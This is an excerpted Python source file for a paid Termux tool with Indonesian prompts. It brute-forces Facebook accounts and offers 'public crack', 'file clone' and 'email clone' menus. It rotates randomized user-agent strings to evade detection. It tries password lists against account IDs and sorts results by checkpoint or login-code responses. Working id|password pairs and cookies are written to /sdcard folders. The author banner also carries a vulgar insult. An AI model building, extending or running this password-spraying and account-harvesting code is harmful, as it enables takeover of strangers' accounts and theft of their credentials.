...
###---[ SOUND PLAY ]---###
def putar_sound(perintah):
	if perintah in ['ok']:
		try:os.popen('play-audio data/soundok.mp3')
		except Exception as e:pass
	elif perintah in ['cp']:
		try:os.popen('play-audio data/soundcp.mp3')
		except Exception as e:pass
	elif perintah in ['finiskrek']:
		try:os.popen('play-audio data/finiskrek.mp3')
		except Exception as e:pass
	elif perintah in ['finisopsi']:
		try:os.popen('play-audio data/finisopsi.mp3')
		except Exception as e:pass
...
def logo(n):
	return str(f"""  
d8888b.  .d88b.  db   db d888888b d888888b 
88  `8D .8P  Y8. 88   88   `88'   `~~88~~' 
88oobY' 88    88 88ooo88    88       88    
88`8b   88    88 88~~~88    88       88    
88 `88. `8b  d8' 88   88   .88.      88    
88   YD  `Y88P'  YP   YP Y888888P    YP    


[+]==============================================
[+]CREATED BY   :  ROHIT MADARCHOD
[+]ON FACEBOK   :  ROHIT RAJPUT
[+]ON GITHUB    :  ROHIT-XD-KING
[+]TEAM         :  TEAM INP
[+]FB GROUP     :  TERMUX TEAM INP COMMOND
[+]TOOL STATUS  :  PAID
[+]TOOL VIRSION :  0.1
[+]==============================================
""")
...
def jam_tutup(jam):
	if str(jam) in ['23','0','1','2']:
		
		print(logo2())
		bas = ["|","/","-","\\"]
		print(f'\n [{M}>{P}] mohon maaf script sedang di tutup')
		#putar_sound('tutup')
		while True:
			for x in bas:print(f'\r [{str(random.choice([kk,hh,M]))}{x}{P}] coba kembali setelah pukul 3 pagi  ',end='');sys.stdout.flush();time.sleep(0.3)
	elif str(jam) in ['10','11','12']:
		clear_layar()
		print(logo2())
		bas = ["|","/","-","\\"]
		print(f'\n [{M}>{P}] mohon maaf script sedang di tutup')
		#putar_sound('tutup')
		while True:
			for x in bas:print(f'\r [{str(random.choice([kk,hh,M]))}{x}{P}] coba kembali setelah pukul 1 siang  ',end='');sys.stdout.flush();time.sleep(0.3)
	else:pass
...
def ua_rozh():
	...
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(3,12))}; TONE e20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,111))}.0.{str(rr(1111,4628))}.{str(rr(50,150))} Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,12))}.{str(rr(2,12))}; Dragon Touch M10X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,111))}.0.{str(rr(1111,4628))}.{str(rr(50,150))} Safari/537.36"]))
...
def menu(n,t,c):
	...
	clear_layar()
	#try:key = open('.apikey.txt','r').read()
	#except:lisensi()
	#data = cek_lisen(key)
	print(logo(n)+f'')
	print(f"[{P}02{P}] Public Crack")
	print(f"[{P}03{P}] File Clone")
	print(f"[{P}04{P}] Email Clone  ")
	print(f"[{P}05{P}] Remove Cookies")
	
	ask = input(f'[{hh}+{P}] menu : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['8','08']:crack_masal(t,c)
	elif ask in ['6','06']:crack_foll(t,c)
	elif ask in ['12']:crack_komen()
...
def cek_opsi_cp():
	nom, no = [], 0
	print(' ─────────────────────────────')
	try:ok = os.listdir('/sdcard/FENZ_CP')
	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('/sdcard/FENZ_CP/'+x,'r').readlines()
		except:continue
	...
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('/sdcard/FENZ_CP/'+file,'r').read().splitlines():
		ua = ua_rozh()
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	putar_sound('finisopsi')
...
def cek_hasil():
	...
	if one in ['1','01']:
		try:ok = os.listdir('/sdcard/FENZ_OK')
		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('/sdcard/FENZ_OK/'+x,'r').readlines()
			except:continue
			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/FENZ_OK/'+file,'r').read()
		...
		abc = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/FENZ_CP/'+file,'r').read()
...
def lisensi():
	clear_layar()
	print(logo2())
	apa = input(f'\n [{hh}1{P}] masukan lisensi\n [{hh}2{P}] beli lisensi\n menu : ')
	if apa in ['1','01']:
		lisen = input(f' [{hh}<{P}] silahkan masukan lisensi anda\n lisensi : ')
		print(' ─────────────────────────────')
		cek_lisen(lisen);open('.apikey.txt','w').write(lisen);back()
	elif apa in ['2','02']:os.system('xdg-open https://wa.me/62859153130120?text=bang+beli+lisensi');exit()
	else:lisensi()

def cek_lisen(lisen):
	try:
		url=ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyMjUzMjYzNiIsIitKY29CT2dFWE5hUGJpLzJnN0RoV1BTRFBPUXpZeFBXdk9kcmkrSUEiXQ==&ProductId=16046&Key="+lisen).json()
		key = url['licenseKey']
		bergabung = key['created'][:10]
		y,m,d = bergabung.split("-")
		month11 = tete[m]
		kadaluwarsa = key['expires'][:10]
		y2,m2,d2 = kadaluwarsa.split("-")
		month22 = tete[m2]
		cos = key['customer']
		email = cos['email']
		nama = cos['name']
		file2 = (f"{d2}{m2}{y2}")
		file3 = (f"{hari}{blx}{tahun}")
		date_format = "%d%m%Y"
		b = datetime.strptime(file2, date_format)
		c = datetime.strptime(file3, date_format)
		delta = b - c 
		if delta.days <1:print(f' [{M}>{P}] lisensi kadaluwarsa');time.sleep(2);lisensi()
		else:
			data = f' [{hh}-{P}] nama  : {kk}{nama.lower()}{P}\n [{hh}+{P}] email : {email}\n [{hh}-{P}] masuk : {d}/{m}/{y}\n [{hh}+{P}] aktif : {hh}{delta.days}{P} hari lagi'
			return data
	except:
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			if str(jam) in ['23','0','1','2','10','11','12']:id.clear()
			...
			if "checkpoint" in ini_cookie:
				...
				if 'Enter login code to continue' in str(auten):break
					...
					if data in rescp:pass
						...
						if 'ya' in cepeh:
							...
							print(f'\r └──{kk} {idf}|{pw}|{gg}\n{x}')
							print(f'\r └──── {hh}{ua}{x}')
							open('/sdcard/FENZ_CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
				...
				if data in resok:pass
					...
					resok.append(data)
					ok+=1
					open('/sdcard/FENZ_OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
...
def cek_opsi(idf,pw,ua):
	...
	else:open('/sdcard/FENZ_CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
...
def make():
	try:os.mkdir('/sdcard/FENZ_OK')
	except:pass
	try:os.mkdir('/sdcard/FENZ_CP')
	except:pass
